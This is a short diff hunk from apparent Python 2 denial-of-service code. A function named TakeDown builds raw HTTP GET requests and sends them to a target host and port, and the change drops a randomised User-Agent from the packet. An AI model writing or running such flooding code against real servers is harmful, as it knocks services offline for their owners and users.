@@ -19,7 +19,7 @@ def TakeDown(host="",port=80):
                 print "Could not resolve hostname."
                 sys.exit()
             else:
-                packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(UsAg)+"\n"+headers).encode('utf-8')
+                packet = str("GET / HTTP/1.1\nHost: "+host+"\n"+headers).encode('utf-8')
                 if sock.connect_ex((host,port))==0:
                     if sock.sendall(packet)==None:
                         print "Packet sent successfuly!"
